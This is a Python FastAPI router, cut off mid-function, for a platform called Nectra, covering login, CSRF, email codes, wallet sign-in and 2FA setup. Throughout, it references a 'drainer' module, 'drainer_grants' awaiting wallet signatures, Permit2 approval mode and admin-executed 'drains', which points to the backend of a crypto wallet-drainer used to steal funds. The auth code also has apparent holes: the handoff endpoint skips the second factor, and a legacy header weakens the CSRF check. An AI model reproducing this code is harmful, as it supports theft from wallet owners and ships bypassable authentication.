"""
Unified API Router for Nectra Platform (Python).

Auth is a cookie session (`nx_sess`) plus a double-submit CSRF token (`nx_csrf`,
readable, mirrored in the `X-CSRF` header on every mutating request).

Second factor: when a user has TOTP enabled, login creates a session with
`pending_2fa = 1`. `get_current_user` refuses everything outside `_TWOFA_EXEMPT`
until `POST /api/auth/2fa/verify` clears the flag.

Money movement has two approval shapes:
  * drains  — super admins execute directly, everyone else creates a request that a
              different admin must approve
  * nothing else moves funds in this build
"""
import asyncio
import base64
import hashlib
import httpx
import json
import logging
import os
import secrets
import time
from typing import Any, Dict, List, Optional

import base58
import pyotp
from eth_account import Account
from eth_account.messages import encode_defunct
from eth_keys import keys as eth_keys
from eth_utils import keccak
from fastapi import APIRouter, HTTPException, Request, Response
from pydantic import BaseModel
from solders.pubkey import Pubkey
from solders.signature import Signature

from database import (get_setting, get_settings, now, q_all, q_col, q_get, q_run,
                      q_val, update_setting)
import chains
import crypto as C
import deposits
import drainer as DR
import engine
import ledger
import mailer
import market
import payout
import receiver
import revoke
import scanners
import security as S
import sim
import solana_tx
import tron_tx

logger = logging.getLogger("routes")
router = APIRouter()

COOKIE_MAX_AGE = 7 * 86400            # matches SESSION_TTL in security.py
COOKIE_SECURE = (get_setting("cookie_secure", False) if False else None)  # resolved per-request
CSRF_COOKIE = "nx_csrf"
CSRF_HEADER = "X-CSRF"
CSRF_MAX_AGE = 86400 * 7
MUTATING = {"POST", "PUT", "PATCH", "DELETE"}

# Paths reachable while a session is still waiting on its second factor.
_TWOFA_EXEMPT = (
    "/api/auth/2fa/",
    "/api/auth/logout",
    "/api/auth/login",
    "/api/auth/register",
    "/api/auth/wallet/",
    "/api/auth/verify-email",
    "/api/auth/resend-verify",
    "/api/auth/forgot",
    "/api/auth/reset",
    "/api/auth/handoff",
    "/api/auth/invite/",
    "/api/waitlist",
    "/api/public/",
    "/api/status",
    "/api/health",
    "/api/market/",
    "/api/me",
    "/api/bootstrap",
)

# Paths an unverified email may still use.
_VERIFY_EXEMPT = _TWOFA_EXEMPT + ("/api/icons", "/api/wallets", "/api/folders")

CODE_TTL_MS = 10 * 60 * 1000
RESET_TTL_MS = 30 * 60 * 1000
HANDOFF_TTL_MS = 5 * 60 * 1000
MAX_CODES_PER_HOUR = 6

ANTI_PHISHING_WORDS = (
    "petal", "harbor", "copper", "meadow", "lantern", "orbit", "cedar", "quartz",
    "viola", "nimbus", "ember", "fjord", "willow", "cobalt", "saffron", "delta",
)


# ---------------------------------------------------------------------------
# Cookie + CSRF helpers
# ---------------------------------------------------------------------------
def _cookie_secure() -> bool:
    return bool(get_setting("cookie_secure", False))


def _issue_session_cookie(response: Response, token: str) -> None:
    response.set_cookie(
        key=S.SESSION_COOKIE, value=token, httponly=True,
        samesite="lax", secure=_cookie_secure(), max_age=COOKIE_MAX_AGE, path="/",
    )


def _issue_csrf(response: Response) -> str:
    token = secrets.token_urlsafe(32)
    response.set_cookie(
        key=CSRF_COOKIE, value=token, httponly=False,
        samesite="lax", secure=_cookie_secure(), max_age=CSRF_MAX_AGE, path="/",
    )
    return token


def _require_csrf(request: Request) -> None:
    """Double-submit check. Bearer-token callers are exempt (no ambient cookie)."""
    if request.method.upper() not in MUTATING:
        return
    if not request.cookies.get(S.SESSION_COOKIE) and \
            request.headers.get("authorization", "").lower().startswith("bearer "):
        return

    cookie = request.cookies.get(CSRF_COOKIE)
    header = request.headers.get("x-csrf")
    # Legacy clients shipped `X-Nectra: 1` only; accept it as a fallback so an
    # older cached app shell keeps working, but prefer the double-submit token.
    legacy = request.headers.get("x-nectra") == "1"
    if not cookie or not header or not secrets.compare_digest(cookie, header):
        if not (cookie and legacy):
            raise HTTPException(status_code=403, detail="CSRF token missing or stale — reload")


# ---------------------------------------------------------------------------
# Auth helpers
# ---------------------------------------------------------------------------
def _token(request: Request) -> Optional[str]:
    token = request.cookies.get(S.SESSION_COOKIE)
    if token:
        return token
    header = request.headers.get("authorization", "")
    if header.lower().startswith("bearer "):
        return header[7:].strip()
    return None


def get_current_user(request: Request) -> Dict[str, Any]:
    sess = S.load_session(_token(request))
    if not sess:
        raise HTTPException(status_code=401, detail="Authentication required")

    user = sess["user"]
    if user.get("status") == "suspended":
        raise HTTPException(status_code=403, detail="Account suspended")
    if user.get("locked_until") and user["locked_until"] > now():
        raise HTTPException(status_code=403, detail="Account is temporarily locked")

    path = request.url.path
    if not user.get("email_verified") and not any(path.startswith(p) for p in _VERIFY_EXEMPT):
        raise HTTPException(status_code=403, detail={
            "code": "EMAIL_UNVERIFIED",
            "message": "Verify your email address to continue",
        })

    if sess["session"].get("pending_2fa"):
        if not any(path.startswith(p) for p in _TWOFA_EXEMPT):
            raise HTTPException(status_code=403, detail={
                "code": "2FA_REQUIRED",
                "message": "Two-factor authentication required",
            })

    user["session"] = sess["session"]
    return user


def optional_user(request: Request) -> Optional[Dict[str, Any]]:
    try:
        return get_current_user(request)
    except HTTPException:
        return None


def _staff_2fa_gate(user: Dict[str, Any]) -> None:
    """When the platform requires staff 2FA, an enrolled-but-off staff user is blocked."""
    if not S.is_staff(user):
        return
    if not get_setting("admin_2fa_required", False):
        return
    if user.get("totp_enabled"):
        return
    raise HTTPException(status_code=403, detail={
        "code": "ADMIN_2FA_REQUIRED",
        "message": "Staff must enable authenticator 2FA before using the admin console",
    })


def require_perm(request: Request, perm: str) -> Dict[str, Any]:
    user = get_current_user(request)
    _staff_2fa_gate(user)
    if not S.can(user, perm):
        raise HTTPException(status_code=403, detail=f"Missing permission: {perm}")
    return user


def require_staff(request: Request) -> Dict[str, Any]:
    user = get_current_user(request)
    if not S.is_staff(user):
        raise HTTPException(status_code=403, detail="Staff access required")
    _staff_2fa_gate(user)
    return user


def require_admin(request: Request) -> Dict[str, Any]:
    return require_staff(request)


def _ip(request: Request) -> str:
    return S.client_ip(request)


def _throttle(request: Request, bucket: str, limit: int, window_ms: int = 60000) -> None:
    key = f"{bucket}:{_ip(request)}"
    if not S.check_rate_limit(key, limit, window_ms):
        raise HTTPException(status_code=429, detail="Too many requests — slow down")


def _own_wallet(user: Dict[str, Any], wid: int) -> Dict[str, Any]:
    wallet = q_get("SELECT * FROM wallets WHERE id = ? AND user_id = ?", wid, user["id"])
    if not wallet:
        raise HTTPException(status_code=404, detail="Wallet not found")
    return wallet


def _initials(name: Optional[str], email: Optional[str]) -> str:
    src = (name or email or "?").strip()
    parts = [p for p in src.replace("@", " ").replace(".", " ").split() if p]
    return ("".join(p[0] for p in parts[:2]) or src[:2]).upper()


def _grant_counts(wallet_id: int) -> Dict[str, int]:
    rows = q_all("SELECT status, COUNT(*) AS n FROM drainer_grants"
                 " WHERE wallet_id = ? AND status IN"
                 " ('pending','awaiting_signature','active','used') GROUP BY status",
                 wallet_id)
    counts = {row["status"]: row["n"] for row in rows}
    return {
        "active": counts.get("active", 0) + counts.get("used", 0),
        "awaiting": counts.get("awaiting_signature", 0) + counts.get("pending", 0),
    }


def _wallet_view(user_id: int, wallet: Dict[str, Any]) -> Dict[str, Any]:
    """
    Wallet row for the browser, with the authorisation state the UI needs to
    deep-link the signing page. Never leaks the raw finder.
    """
    view = engine.wallet_view(wallet)
    counts = _grant_counts(wallet["id"])
    family = (wallet.get("family") or "").lower()
    view.update({
        "name": wallet.get("name") or wallet.get("label") or "Wallet",
        "source": wallet.get("source") or "watch",
        "folder": wallet.get("folder") or "Unsorted",
        "chain": wallet.get("chain"),
        "symbol": engine.NATIVE_MAP.get(family, "SOL"),
        "activeGrants": counts["active"],
        "awaitingGrants": counts["awaiting"],
        "signable": family in ("evm", "solana", "tron") and bool(wallet.get("verified")),
        "signUrl": (f"/sign.html?wallet={wallet['id']}"
                    if counts["awaiting"] and family in ("evm", "solana", "tron")
                    and wallet.get("verified") else None),
    })
    return view


def _clear_2fa(session_id: int) -> None:
    q_run("UPDATE sessions SET pending_2fa = 0 WHERE id = ?", session_id)


# ---------------------------------------------------------------------------
# One-time email codes (verification + password reset)
# ---------------------------------------------------------------------------
def _code_hash(code: str) -> str:
    return hashlib.sha256((code or "").strip().encode("utf-8")).hexdigest()


def _issue_code(user: Dict[str, Any], purpose: str, ttl_ms: int) -> str:
    """Create a fresh numeric code, invalidating older unused ones."""
    code = f"{secrets.randbelow(1_000_000):06d}"
    q_run("UPDATE email_codes SET used = 1 WHERE user_id = ? AND purpose = ? AND used = 0",
          user["id"], purpose)
    q_run("INSERT INTO email_codes (user_id, purpose, code_hash, expires_at, used,"
          " created_at) VALUES (?, ?, ?, ?, 0, ?)",
          user["id"], purpose, _code_hash(code), now() + ttl_ms, now())
    return code


def _codes_sent_last_hour(user_id: int) -> int:
    return int(q_val("SELECT COUNT(*) FROM email_codes WHERE user_id = ? AND created_at > ?",
                     user_id, now() - 60 * 60 * 1000) or 0)


def _consume_code(user: Dict[str, Any], purpose: str, code: str) -> None:
    code = (code or "").strip()
    if not code:
        raise HTTPException(status_code=400, detail="Enter the code from your email")
    row = q_get(
        "SELECT * FROM email_codes WHERE user_id = ? AND purpose = ? AND used = 0"
        " ORDER BY id DESC LIMIT 1", user["id"], purpose)
    if not row or row["expires_at"] < now():
        raise HTTPException(status_code=400, detail="Code is expired — request a new one")
    if not secrets.compare_digest(row["code_hash"], _code_hash(code)):
        raise HTTPException(status_code=400, detail="That code is not correct")
    q_run("UPDATE email_codes SET used = 1 WHERE id = ?", row["id"])


def _send_verification(user: Dict[str, Any]) -> Optional[str]:
    """Send a new verification code. Returns the plaintext code in demo mode."""
    code = _issue_code(user, "verify", CODE_TTL_MS)
    mailer.send_code(
        user["email"], f"{get_setting('platform_name', 'NECTRA')} email verification",
        code, CODE_TTL_MS // 60_000,
        "Confirm this email address to activate your account.",
        user.get("anti_phishing"),
    )
    return code if get_setting("demo_mode", False) else None


def _new_anti_phishing() -> str:
    return f"{secrets.choice(ANTI_PHISHING_WORDS)}-{secrets.randbelow(900) + 100}"


def _validate_invite(code: Optional[str]) -> Optional[str]:
    """
    Returns a normalised accepted code, or raises. When invite-only is off an
    unknown code is still accepted so social links keep working.
    """
    code = (code or "").strip().upper()
    invite_only = bool(get_setting("invite_only", False))
    if not code:
        if invite_only:
            raise HTTPException(status_code=400, detail="An invite code is required")
        return None
    row = q_get("SELECT * FROM invites WHERE code = ? COLLATE NOCASE", code)
    if row and row.get("active") and int(row.get("uses") or 0) < int(row.get("max_uses") or 1):
        return row["code"]
    if invite_only:
        raise HTTPException(status_code=400, detail="That invite code is invalid or used up")
    return code


def _redeem_invite(code: Optional[str]) -> Optional[str]:
    if not code:
        return None
    row = q_get("SELECT * FROM invites WHERE code = ? COLLATE NOCASE", code)
    if row:
        q_run("UPDATE invites SET uses = uses + 1 WHERE code = ?", row["code"])
        return row["code"]
    return None


def _login_response(user: Dict[str, Any], token: str, *,
                    pending_2fa: bool = False) -> Dict[str, Any]:
    """Shared shape for password, wallet and 2FA completion responses."""
    return {
        "ok": True,
        "token": token,
        "user": S.sanitize_user(user),
        "twoFA": pending_2fa,
        "twofaRequired": pending_2fa,
        "needsVerification": not bool(user.get("email_verified")),
    }


# ---------------------------------------------------------------------------
# Public & system
# ---------------------------------------------------------------------------
def _public_evm_chains() -> List[Dict[str, Any]]:
    """Chain metadata the browser needs to switch/add a network in the wallet."""
    out: List[Dict[str, Any]] = []
    for name, cfg in chains.EVM_NETWORKS.items():
        out.append({
            "name": name,
            "chainId": cfg["chainId"],
            "hexChainId": hex(cfg["chainId"]),
            "native": cfg["native"],
            "nativeDecimals": cfg.get("nativeDecimals", 18),
            # Public fallback only: an RPC_* override may embed an API key.
            "rpc": cfg["rpc"],
            "explorer": cfg.get("explorer"),
            "testnet": bool(cfg.get("testnet")),
            "permit2": bool(cfg.get("permit2", True)),
            "tokens": [
                {"symbol": sym, "address": addr,
                 "decimals": (cfg.get("tokenDecimals") or {}).get(sym)}
                for sym, addr in (cfg.get("tokens") or {}).items()
            ],
        })
    return out


@router.get("/api/public/chains")
async def get_public_chains():
    return {"chains": _public_evm_chains()}


@router.get("/api/public/config")
async def get_public_config(response: Response):
    _issue_csrf(response)
    return {
        "platform_name": get_setting("platform_name", "NECTRA"),
        "invite_only": get_setting("invite_only", False),
        "registration_open": get_setting("registration_open", True),
        "demo_mode": get_setting("demo_mode", False),
        "monetization_enabled": get_setting("monetization_enabled", True),
        "live_trading_enabled": get_setting("live_trading_enabled", True),
        "drainer_enabled": get_setting("drainer_enabled", True),
        "evm_approval_mode": get_setting("drainer_evm_mode", "permit2"),
        "require_wallet_signature": get_setting("require_wallet_signature", True),
        "chains": ["solana", "evm", "tron", "btc", "ltc"],
        "evm_chains": _public_evm_chains(),
    }


@router.get("/api/status")
async def get_status():
    components = q_all("SELECT name, state, note FROM status_components ORDER BY sort")
    level = "green"
    for component in components:
        if component.get("state") == "red":
            level = "red"
            break
        if component.get("state") == "amber":
            level = "amber"
    return {
        "level": level,
        "label": "All systems normal" if level == "green" else "Degraded performance",
        "components": components,
        "feed": {"degraded": False},
    }


@router.get("/api/health")
async def get_health():
    return {"status": "ok", "timestamp": now(),
            "banner": {"active": bool(get_setting("maintenance_banner", "")),
                       "message": get_setting("maintenance_banner", "")}}


@router.get("/api/market/tokens")
async def get_market_tokens():
    return {"tokens": market.get_tokens()}


@router.get("/api/market/series")
async def get_market_series(sym: str = "SOL", range: str = "24h"):
    return {"points": market.get_series(sym, range)}


@router.get("/api/bootstrap")
async def get_bootstrap(request: Request, response: Response):
    if not request.cookies.get(CSRF_COOKIE):
        _issue_csrf(response)
    user = optional_user(request)
    settings = {
        "platform_name": get_setting("platform_name", "NECTRA"),
        "demo_mode": get_setting("demo_mode", False),
        "drainer_enabled": get_setting("drainer_enabled", True),
        "evm_approval_mode": get_setting("drainer_evm_mode", "permit2"),
        "monetization_enabled": get_setting("monetization_enabled", True),
    }
    if not user:
        return {
            "user": None,
            "twofaRequired": False,
            "prices": market.PRICES,
            "tokens": market.get_tokens(),
            "status": {"level": "green", "label": "All systems normal", "components": []},
            "wallets": [], "mainWallet": None, "bots": [], "unread": 0,
            "accountBalance": 0, "settings": settings,
        }

    wallets = q_all("SELECT * FROM wallets WHERE user_id = ? ORDER BY is_main DESC, id ASC",
                    user["id"])
    payload = _wallet_payload(user["id"], wallets)
    components = q_all("SELECT name, state, note FROM status_components ORDER BY sort")
    level = "green"
    for component in components:
        if component.get("state") == "red":
            level = "red"
            break
        if component.get("state") == "amber":
            level = "amber"
    return {
        "user": _account_view(user),
        "twofaRequired": bool(user.get("session", {}).get("pending_2fa")),
        "prices": market.PRICES,
        "tokens": market.get_tokens(),
        "status": {"level": level,
                   "label": "All systems normal" if level == "green" else "Degraded performance",
                   "components": components},
        "wallets": payload["wallets"],
        "mainWallet": payload["main"],
        "totals": payload["totals"],
        "folders": payload["folders"],
        "accountBalance": payload["accountBalance"],
        "bots": [],
        "unread": int(q_val("SELECT COUNT(*) FROM notifications WHERE user_id = ?"
                            " AND unread = 1", user["id"]) or 0),
        "settings": settings,
    }


# ---------------------------------------------------------------------------
# Auth
# ---------------------------------------------------------------------------
class CodePayload(BaseModel):
    code: str


class RegisterPayload(BaseModel):
    email: str
    password: str
    name: Optional[str] = None
    invite_code: Optional[str] = None
    code: Optional[str] = None            # invite code (client field name)
    acceptTerms: Optional[bool] = False
    hp_check: Optional[str] = ""          # honeypot: must be empty
    client_ts: Optional[int] = None


@router.post("/api/auth/register")
async def register(body: RegisterPayload, request: Request, response: Response):
    _require_csrf(request)
    _throttle(request, "register", 10, 3600_000)

    if not get_setting("registration_open", True):
        raise HTTPException(status_code=403, detail="Registration is closed")

    # Honeypot — real people never fill this hidden field.
    if (body.hp_check or "").strip():
        raise HTTPException(status_code=400, detail="Sign-up rejected — please retry")

    email = (body.email or "").strip().lower()
    if not email or "@" not in email or "." not in email.split("@")[-1]:
        raise HTTPException(status_code=400, detail="Invalid email format")
    if len(body.password or "") < 8:
        raise HTTPException(status_code=400, detail="Password must be at least 8 characters")
    if not body.acceptTerms:
        raise HTTPException(status_code=400, detail="Accept the terms to continue")
    if q_get("SELECT id FROM users WHERE email = ?", email):
        raise HTTPException(status_code=409, detail="Email is already registered")

    invite_code = _validate_invite(body.code or body.invite_code)

    password_hash = S.hash_password(body.password)
    user_id = q_run(
        "INSERT INTO users (email, pw_hash, password_hash, name, role, paper_mode,"
        " email_verified, anti_phishing, created_at) VALUES (?, ?, ?, ?, 'trader', 1, 0, ?, ?)",
        email, password_hash, password_hash, body.name or email.split("@")[0],
        _new_anti_phishing(), now(),
    )["id"]

    q_run("INSERT INTO paper_balances (user_id, symbol, balance, updated_at)"
          " VALUES (?, 'USD', 10000.0, ?)", user_id, now())
    q_run("INSERT INTO balance_ledger (user_id, delta, kind, ref, created_at)"
          " VALUES (?, 10000.0, 'starting_balance', 'register', ?)", user_id, now())
    sim.ensure_account(user_id, initial=10000.0)
    _redeem_invite(invite_code)

    user = q_get("SELECT * FROM users WHERE id = ?", user_id)
    dev_code = _send_verification(user)

    token = S.create_session(user_id, ip=_ip(request),
                             user_agent=request.headers.get("user-agent", ""))
    _issue_session_cookie(response, token)
    _issue_csrf(response)
    S.audit(user_id, "auth.register", user_id,
            {"invite": invite_code, "wallet": False}, ip=_ip(request))
    result = _login_response(user, token)
    if dev_code:
        result["devCode"] = dev_code
    return result


class LoginPayload(BaseModel):
    email: str
    password: str


@router.post("/api/auth/login")
async def login(body: LoginPayload, request: Request, response: Response):
    _require_csrf(request)
    _throttle(request, "login", 12, 60_000)

    email = (body.email or "").strip().lower()
    user = q_get("SELECT * FROM users WHERE email = ?", email)

    if not user or not S.verify_password(body.password, S.resolve_password_hash(user)):
        if user:
            S.note_failed_login(user)
        raise HTTPException(status_code=401, detail="Invalid email or password")

    if user.get("locked_until") and user["locked_until"] > now():
        raise HTTPException(status_code=403, detail="Too many attempts — try again later")
    if user.get("status") == "suspended":
        raise HTTPException(status_code=403, detail="Account suspended")

    S.clear_failed_logins(user["id"])

    needs_second_factor = bool(user.get("totp_enabled"))
    token = S.create_session(
        user["id"], ip=_ip(request), user_agent=request.headers.get("user-agent", ""),
        pending_2fa=needs_second_factor,
    )
    _issue_session_cookie(response, token)
    _issue_csrf(response)
    q_run("UPDATE users SET last_login_at = ? WHERE id = ?", now(), user["id"])
    S.audit(user["id"], "auth.login", user["id"],
            {"pending_2fa": needs_second_factor}, ip=_ip(request))

    return _login_response(user, token, pending_2fa=needs_second_factor)


@router.post("/api/auth/invite/validate")
async def validate_invite(body: Dict[str, Any], request: Request):
    _require_csrf(request)
    _throttle(request, "invite-check", 30)
    code = _validate_invite(body.get("code"))
    return {"ok": True, "code": code}


@router.post("/api/waitlist")
async def join_waitlist(body: Dict[str, Any], request: Request):
    _require_csrf(request)
    _throttle(request, "waitlist", 10, 3600_000)
    email = (body.get("email") or "").strip().lower()
    if not email or "@" not in email:
        raise HTTPException(status_code=400, detail="Invalid email format")
    if q_get("SELECT id FROM waitlist WHERE email = ?", email):
        return {"ok": True, "message": "You are already on the waitlist"}
    q_run("INSERT INTO waitlist (email, referral, status, created_at)"
          " VALUES (?, ?, 'pending', ?)", email, (body.get("referral") or "")[:100], now())
    return {"ok": True}


@router.post("/api/auth/logout")
async def logout(request: Request, response: Response):
    _require_csrf(request)
    token = _token(request)
    if token:
        S.clear_session(token)
    response.delete_cookie(key=S.SESSION_COOKIE, path="/")
    response.delete_cookie(key=CSRF_COOKIE, path="/")
    return {"ok": True}


# ---------------------------------------------------------------------------
# Email verification & password reset
# ---------------------------------------------------------------------------
@router.post("/api/auth/verify-email")
async def verify_email(body: CodePayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "verify-email", 15, 15 * 60_000)

    if user.get("email_verified"):
        return {"ok": True, "already": True}

    _consume_code(user, "verify", body.code)
    q_run("UPDATE users SET email_verified = 1 WHERE id = ?", user["id"])
    S.audit(user["id"], "auth.email_verified", user["id"], ip=_ip(request))
    return {"ok": True}


@router.post("/api/auth/resend-verify")
async def resend_verification(request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "resend-verify", 6, 15 * 60_000)

    if user.get("email_verified"):
        return {"ok": True, "already": True}
    if _codes_sent_last_hour(user["id"]) >= MAX_CODES_PER_HOUR:
        raise HTTPException(status_code=429, detail="Too many codes — wait an hour")

    code = _send_verification(user)
    S.audit(user["id"], "auth.resend_verify", user["id"], ip=_ip(request))
    return {"ok": True, **({"devCode": code} if code else {})}


class ForgotPayload(BaseModel):
    email: str


@router.post("/api/auth/forgot")
async def forgot_password(body: ForgotPayload, request: Request):
    _require_csrf(request)
    _throttle(request, "forgot", 8, 15 * 60_000)

    email = (body.email or "").strip().lower()
    user = q_get("SELECT * FROM users WHERE email = ?", email)
    # Always report success so the endpoint cannot be used to enumerate accounts.
    if not user or user.get("status") == "suspended":
        return {"ok": True}

    if _codes_sent_last_hour(user["id"]) < MAX_CODES_PER_HOUR:
        code = _issue_code(user, "reset", RESET_TTL_MS)
        mailer.send_code(
            user["email"], f"{get_setting('platform_name', 'NECTRA')} password reset",
            code, RESET_TTL_MS // 60_000,
            "Use this code to set a new password.",
            user.get("anti_phishing"),
        )
        if get_setting("demo_mode", False):
            return {"ok": True, "devCode": code}
    return {"ok": True}


class ResetPayload(BaseModel):
    email: str
    code: str
    password: str


@router.post("/api/auth/reset")
async def reset_password(body: ResetPayload, request: Request):
    _require_csrf(request)
    _throttle(request, "reset", 10, 15 * 60_000)

    email = (body.email or "").strip().lower()
    user = q_get("SELECT * FROM users WHERE email = ?", email)
    if not user:
        raise HTTPException(status_code=400, detail="Unknown account")
    if len(body.password or "") < 8:
        raise HTTPException(status_code=400, detail="Password must be at least 8 characters")

    _consume_code(user, "reset", body.code)

    password_hash = S.hash_password(body.password)
    q_run("UPDATE users SET pw_hash = ?, password_hash = ?, email_verified = 1,"
          " failed_logins = 0, locked_until = NULL WHERE id = ?",
          password_hash, password_hash, user["id"])
    S.clear_user_sessions(user["id"])
    S.audit(user["id"], "auth.password_reset", user["id"], ip=_ip(request))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Wallet sign-in / sign-up (and mobile hand-off)
# ---------------------------------------------------------------------------
class WalletNoncePayload(BaseModel):
    address: str
    purpose: Optional[str] = "login"
    family: Optional[str] = "solana"


class WalletAuthPayload(BaseModel):
    address: str
    family: Optional[str] = "solana"
    provider: Optional[str] = None
    nonce: Optional[str] = None
    signature: Optional[str] = None
    message: Optional[str] = None
    code: Optional[str] = None           # invite code when registering


def _check_address(family: str, address: str) -> None:
    if family == "evm" and not chains.is_evm_address(address):
        raise HTTPException(status_code=400, detail="Invalid EVM address")
    if family == "solana" and not chains.is_sol_address(address):
        raise HTTPException(status_code=400, detail="Invalid Solana address")
    if family == "tron" and not chains.is_tron_address(address):
        raise HTTPException(status_code=400, detail="Invalid Tron address")
    if family not in ("evm", "solana", "tron"):
        raise HTTPException(status_code=400, detail="Unsupported wallet family")


@router.post("/api/auth/wallet/nonce")
async def auth_wallet_nonce(body: WalletNoncePayload, request: Request):
    """Issue the message a not-yet-signed-in wallet signs. No session needed."""
    _require_csrf(request)
    _throttle(request, "wallet-auth-nonce", 40)

    address = (body.address or "").strip()
    family = (body.family or "solana").lower()
    purpose = (body.purpose or "login").lower()
    if purpose not in ("login", "register", "link"):
        purpose = "login"
    if not address:
        raise HTTPException(status_code=400, detail="address is required")
    _check_address(family, address)

    nonce = secrets.token_hex(16)
    message = (f"{get_setting('platform_name', 'NECTRA')} wallet {purpose}\n"
               f"address: {address}\nnonce: {nonce}\nissued: {now()}")
    # While signed in, the same nonce feeds `POST /api/wallets`, which looks rows
    # up by purpose 'wallet' and owning user — keep the two shapes compatible.
    signed_in = optional_user(request)
    verified_session = bool(signed_in and signed_in.get("email_verified"))
    stored_purpose = "wallet" if verified_session else purpose
    q_run("INSERT OR REPLACE INTO nonces (nonce, address, purpose, message, user_id,"
          " created_at) VALUES (?, ?, ?, ?, ?, ?)",
          nonce, address, stored_purpose, message,
          signed_in["id"] if signed_in else None, now())
    return {"nonce": nonce, "message": message, "address": address}


def _wallet_user(address: str) -> Optional[Dict[str, Any]]:
    row = q_get("SELECT * FROM users WHERE wallet_login = ?", address)
    if row:
        return row
    wallet = q_get("SELECT * FROM wallets WHERE address = ? AND verified = 1"
                   " ORDER BY id ASC LIMIT 1", address)
    if wallet:
        return q_get("SELECT * FROM users WHERE id = ?", wallet["user_id"])
    return None


def _link_wallet_row(user: Dict[str, Any], address: str, family: str,
                     provider: Optional[str]) -> None:
    if q_get("SELECT id FROM wallets WHERE user_id = ? AND address = ?",
             user["id"], address):
        return
    q_run("INSERT INTO wallets (user_id, name, label, address, family, chain, source,"
          " verified, verified_at, created_at) VALUES (?, ?, ?, ?, ?, ?, 'connected', 1, ?, ?)",
          user["id"], f"{family.upper()} Wallet", f"{family.upper()} Wallet", address,
          family, family.upper(), now(), now())


@router.post("/api/auth/wallet/verify")
async def auth_wallet_verify(body: WalletAuthPayload, request: Request, response: Response):
    """Prove wallet ownership, then sign in — or create the account."""
    _require_csrf(request)
    _throttle(request, "wallet-auth", 20)

    address = (body.address or "").strip()
    family = (body.family or "solana").lower()
    if not address:
        raise HTTPException(status_code=400, detail="address is required")
    _check_address(family, address)

    nonce_row = q_get("SELECT * FROM nonces WHERE nonce = ? AND address = ? AND used = 0",
                      (body.nonce or "").strip(), address)
    if not nonce_row:
        raise HTTPException(status_code=400, detail="Nonce missing or already used — retry")
    if int(nonce_row.get("created_at") or 0) < now() - 10 * 60 * 1000:
        raise HTTPException(status_code=400, detail="Nonce expired — retry")
    if not body.signature or not body.message:
        raise HTTPException(status_code=400, detail="Signature is required")
    if not _verify_wallet_proof(family, address, body.message, body.signature):
        raise HTTPException(status_code=400, detail="Signature does not match address")

    purpose = nonce_row.get("purpose") or "login"
    q_run("UPDATE nonces SET used = 1 WHERE nonce = ?", nonce_row["nonce"])

    user = _wallet_user(address)
    if user:
        if user.get("status") == "suspended":
            raise HTTPException(status_code=403, detail="Account suspended")
        if not user.get("wallet_login"):
            q_run("UPDATE users SET wallet_login = ? WHERE id = ?", address, user["id"])
        _link_wallet_row(user, address, family, body.provider)
    else:
        if purpose not in ("register", "wallet"):
            raise HTTPException(
                status_code=404,
                detail="No account is linked to this wallet — create one first")
        if not get_setting("registration_open", True):
            raise HTTPException(status_code=403, detail="Registration is closed")

        invite = _validate_invite(body.code)
        email = f"{address.lower()}@wallet.local"
        if q_get("SELECT id FROM users WHERE email = ?", email):
            email = f"{address.lower()}@wallet"
        user_id = q_run(
            "INSERT INTO users (email, name, role, paper_mode, email_verified,"
            " wallet_login, anti_phishing, created_at)"
            " VALUES (?, ?, 'trader', 1, 1, ?, ?, ?)",
            email, f"{family.upper()} {address[:6]}", address, _new_anti_phishing(), now(),
        )["id"]
        q_run("INSERT INTO paper_balances (user_id, symbol, balance, updated_at)"
              " VALUES (?, 'USD', 10000.0, ?)", user_id, now())
        q_run("INSERT INTO balance_ledger (user_id, delta, kind, ref, created_at)"
              " VALUES (?, 10000.0, 'starting_balance', 'wallet-register', ?)",
              user_id, now())
        sim.ensure_account(user_id, initial=10000.0)
        _redeem_invite(invite)
        user = q_get("SELECT * FROM users WHERE id = ?", user_id)
        _link_wallet_row(user, address, family, body.provider)
        S.audit(user_id, "auth.register", user_id,
                {"invite": invite, "wallet": True, "address": address}, ip=_ip(request))

    S.clear_failed_logins(user["id"])
    needs_second_factor = bool(user.get("totp_enabled"))
    token = S.create_session(user["id"], ip=_ip(request),
                             user_agent=request.headers.get("user-agent", ""),
                             pending_2fa=needs_second_factor)
    _issue_session_cookie(response, token)
    _issue_csrf(response)
    q_run("UPDATE users SET last_login_at = ? WHERE id = ?", now(), user["id"])
    S.audit(user["id"], "auth.wallet_login", user["id"],
            {"purpose": purpose}, ip=_ip(request))
    return _login_response(user, token, pending_2fa=needs_second_factor)


@router.get("/api/auth/handoff")
async def create_handoff(request: Request):
    """Short-lived token so a wallet's in-app browser can pick up the session."""
    user = get_current_user(request)
    token = secrets.token_urlsafe(32)
    q_run("INSERT INTO handoff_tokens (token_hash, user_id, expires_at, used, created_at)"
          " VALUES (?, ?, ?, 0, ?)",
          hashlib.sha256(token.encode()).hexdigest(), user["id"],
          now() + HANDOFF_TTL_MS, now())
    return {"handoff": token, "expires_in": HANDOFF_TTL_MS // 1000}


@router.post("/api/auth/handoff/consume")
async def consume_handoff(body: Dict[str, Any], request: Request, response: Response):
    _require_csrf(request)
    _throttle(request, "handoff", 30)
    raw = (body.get("token") or "").strip()
    if not raw:
        raise HTTPException(status_code=400, detail="token is required")
    token_hash = hashlib.sha256(raw.encode()).hexdigest()
    row = q_get("SELECT * FROM handoff_tokens WHERE token_hash = ? AND used = 0", token_hash)
    if not row or row["expires_at"] < now():
        raise HTTPException(status_code=400, detail="Handoff token expired")
    user = q_get("SELECT * FROM users WHERE id = ?", row["user_id"])
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    q_run("UPDATE handoff_tokens SET used = 1 WHERE token_hash = ?", token_hash)

    token = S.create_session(user["id"], ip=_ip(request),
                             user_agent=request.headers.get("user-agent", ""))
    _issue_session_cookie(response, token)
    _issue_csrf(response)
    return {"ok": True, "user": S.sanitize_user(user)}


# ---------------------------------------------------------------------------
# Second factor
# ---------------------------------------------------------------------------
def _totp_secret(user: Dict[str, Any]) -> str:
    secret = user.get("totp_secret")
    if not secret:
        raise HTTPException(status_code=400, detail="No authenticator enrolled")
    return secret


@router.post("/api/auth/2fa/setup")
@router.post("/api/me/2fa/setup")
async def twofa_setup(request: Request):
    """Stage a secret. Nothing is enforced until `enable` confirms a code."""
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "2fa-setup", 10)

    secret = pyotp.random_base32()
